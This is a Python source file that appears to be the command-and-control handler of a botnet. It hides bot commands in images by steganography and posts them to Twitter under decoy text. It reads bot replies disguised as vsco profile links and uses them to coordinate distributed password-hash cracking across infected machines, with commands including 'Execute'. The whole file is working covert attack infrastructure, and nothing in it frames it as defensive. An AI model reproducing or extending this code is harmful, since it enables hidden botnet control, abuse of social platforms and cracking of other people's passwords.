import utility
import os
import gui_handler
import streamer
import streamer_bot
import time
import string
import threading
import post_constructor
import codecs
import banner_print
from datetime import datetime
import ccp_support
import ccp

COMMAND_LIST = ['Execute', 'Echo', 'Confirm', 'Calculate']
DEFAULT_PICTURE_FILE = 'apple.png'
# If hash was found by another
HASH_BREAK_FOUND = False
HASH_FUNC = ''
ROCKYOU_PASS = 14341564

# DESKTOP-RSN4T39 LAB40-19


def handle_gui():
    gui_handler.vp_start_gui()


def confirm_bots(num_of_replies=5):
    active_bots = []
    status, filename = post_constructor.get_post()
    result = utility.hide(filename, 'Confirm')
    if result:
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        streamer_bot.HandlePost.post_opener_tweet('Follow for discounts. ' + current_time)
        streamer.HandlePost.post_tweet(filename, status)
    else:
        ccp_support.update_feedback('[!]  Something went wrong while hiding the message in: ' + filename)
        return

    time.sleep(20)
    # temp = streamer.TwitterClient()
    temp = streamer_bot.TwitterClient()
    bot_replies = streamer_bot.TwitterClient.get_user_timeline_replies(temp, num_of_replies)
    ccp_support.update_feedback(bot_replies)

    # If no bots were found try again
    if not bot_replies:
        time.sleep(40)
        streamer.HandlePost.post_tweet(filename, status)
        time.sleep(20)
        bot_replies = streamer_bot.TwitterClient.get_user_timeline_replies(temp, num_of_replies)

    if not bot_replies:
        ccp_support.update_feedback('[*]  API problem try again later.')
        return []

    for confirmation in bot_replies:
        ccp_support.update_feedback('[-]  ' + confirmation)
        confirmation_split = confirmation.split(' ----&gt; ')
        bot_name = confirmation_split[0][confirmation_split[0].index(':') + 2:]

        encoder = codecs.getencoder('rot-13')
        bot_name = encoder(bot_name)
        bot_name = bot_name[0]

        active_bots.append(bot_name)

    return active_bots


def construct_command(active_bots, command, params, hash_algorithm, given_range=''):
    # Command: PCNAME COMMAND#PARAM *** PCNAME COMMAND#PARAM

    global HASH_FUNC

    ccp_support.update_feedback('[!]  Constructing command')
    instructions = ''
    count = 0
    if command == 'Calculate':
        if given_range != '':
            ranges = [given_range, 'END OF RANGE']
        else:
            low_char = string.ascii_lowercase
            cap_char = string.ascii_uppercase
            iterable = low_char + cap_char + '1234567890'

            # Split into ranges 5 character long
            ranges = [iterable[i:i+5] for i in range(0, len(iterable), 5)]

        for bot in active_bots:
            # Add the command and the first parameter - HASH
            instructions += bot + ' ' + command + '#' + params[0] + '#'

            # Add the char range into the message
            instructions += ranges[count]
            count += 1

            # Add the password length into the message
            instructions += '#' + params[1] + '#' + hash_algorithm
            instructions += ' *** '

        return instructions[:-5], ranges[count:]

    else:
        pass


def manage_calculate_replies(ranges, command_params, hash_algorithm, num_of_replies=5):

    # TODO TAKE IN ACCOUNT NOT IDLE BOTS RETURN RANGES

    global HASH_BREAK_FOUND

    ccp_support.update_feedback('[!]  Listening for calculation replies')

    temp = streamer_bot.TwitterClient()

    while True:
        if ranges == []:
            ccp_support.update_feedback('[!]  Out of range')
            break

        bot_replies = streamer_bot.TwitterClient.get_user_timeline_replies(temp, num_of_replies, True)
        if bot_replies:
            #
            handeling_ranges = ranges[:len(bot_replies)]
            ranges = ranges[len(bot_replies):]
            dup_replies = bot_replies
            # ext_url = ext_urls[0]
            # ext_urls = ext_urls[1:]

            calc_thread = threading.Thread(name='calculations_manager', target=manage_calulate_replies_helper,
                                           args=(handeling_ranges, dup_replies, command_params, hash_algorithm))
            calc_thread.start()

            # Wait an additional time for the post to upload
            time.sleep(10)

        if HASH_BREAK_FOUND:
            return

        time.sleep(10)


def manage_calulate_replies_helper(handeling_ranges, bot_replies, command_params, hash_algorithm):
    global HASH_BREAK_FOUND
    global HASH_FUNC

    for reply in bot_replies:
        if 'For more by me follow the link:' in reply:
            # Hash was found tell all bots
            print("HELLO")
            ccp_support.update_feedback('[!!!]  The has was found, telling bots and stopping calculations')
            print("HELLO")
            mix = reply.replace('For more by me follow the link: https://www.vsco.co/', '')
            solved_hash = mix.split('/')[0]
            status, filename = post_constructor.get_post()
            result = utility.hide(filename, 'HashFound')
            if result:
                streamer.HandlePost.post_tweet(filename, status)
            print("HELLO")
            ccp_support.update_feedback('The cracked hash: ' + solved_hash.replace('@roylccp ', ''))
            print('Found')
            HASH_BREAK_FOUND = True
            return

        if 'Check me out on: ' in reply:
            # Bot didnt solve in range
            ccp_support.update_feedback('[-]  Retrieved reply ' + reply)
            ccp_support.update_feedback('[!]  A bot hasn\'t found the hash within the given range, giving a new range')
            mix = reply.replace(r'Check me out on: https://www.vsco.co/', '')
            bot_name = mix.split('/')[1]
            # ccp_support.update_feedback(bot_name, 'Calculate', command_params, hash_algorithm, handeling_ranges[0])
            message, ranges_left = construct_command([bot_name], 'Calculate', command_params, hash_algorithm,
                                                     handeling_ranges[0])

            print('[-]  Posting ' + message)

            handeling_ranges = ranges_left[1:]
            status, filename = post_constructor.get_post()
            result = utility.hide(filename, message)
            if result:
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                streamer_bot.HandlePost.post_opener_tweet('Follow for discounts. ' + current_time)
                streamer.HandlePost.post_tweet(filename, status)


def main():
    global HASH_FUNC

    banner_print.print_banner()
    print('[!]  Started')
    print('[!]  Confirming bots')
    active_bots = confirm_bots()
    print('[!]  Done confirming bots, fetched list of active bots: ')
    # active_bots = ['DESKTOP-RSN4T39']
    print(active_bots)

    if input('[?]  Exit? ') == 'y':
        return

    command = input('[?]  Input the command: ')
    hash_algorithm = input('[?]  Input the hash algorithm: ')
    HASH_FUNC = hash_algorithm
    params = input('[?] Input parameters split by a #')
    params = params.split('#')
    message, ranges_left = construct_command(active_bots, command, params, hash_algorithm)

    print('[-]  ' + message)

    # if input('[?]  Exit? ') == 'y':
    #    return

    status, filename = post_constructor.get_post()
    result = utility.hide(filename, message)

    if result:
        print('[!]  Image has been encoded')
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        streamer_bot.HandlePost.post_opener_tweet('Follow for discounts. ' + current_time)
        streamer.HandlePost.post_tweet(filename, status)
    else:
        print('[*]  Bad image mode')
        return

    # In case of the calculate command continue listening for replies and instruct
    if command == 'Calculate':
        manage_calculate_replies(ranges_left, params, hash_algorithm)


def start_handler(hash_algorithm, params):
    global HASH_BREAK_FOUND
    ccp_support.update_feedback('Started')
    ccp_support.update_feedback('Confirming bots')
    active_bots = confirm_bots()

    if active_bots == []:
        time.sleep(10)
        return

    ccp_support.insert_bots(active_bots)
    ccp_support.update_feedback('Done confirming bots, fetched list of active bots: ')
    # active_bots = ['DESKTOP-RSN4T39']
    ccp_support.update_feedback(active_bots)

    command = 'Calculate'
    params = params.split('#')
    message, ranges_left = construct_command(active_bots, command, params, hash_algorithm)

    ccp_support.update_feedback('[-]  ' + message)

    # if input('[?]  Exit? ') == 'y':
    #    return

    status, filename = post_constructor.get_post()
    result = utility.hide(filename, message)

    if result:
        ccp_support.update_feedback('Image has been encoded')
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        streamer_bot.HandlePost.post_opener_tweet('Follow for discounts. ' + current_time)
        streamer.HandlePost.post_tweet(filename, status)
    else:
        ccp_support.update_feedback('Bad image mode')
        return

    # In case of the calculate command continue listening for replies and instruct
    if command == 'Calculate':
        manage_calculate_replies(ranges_left, params, hash_algorithm)
        HASH_BREAK_FOUND = False
    ccp.HANDLER_THREAD_RUNNING = False
    print('HANDLER DONE')


def direct_control():
    # message = 'LAB40-19 Calculate#900150983cd24fb0d6963f7d28e17f72#abc#4'
    # result = utility.hide('apple.png', message)
    # HandlePost.post_tweet('apple.png', 'TEST')

    result = utility.hide(DEFAULT_PICTURE_FILE, 'LAB40-19 HashFound')
    if result:
        streamer.HandlePost.post_tweet(DEFAULT_PICTURE_FILE, '[]')


if __name__ == '__main__':
    print('Started handler')
    main()
    print('Done handler')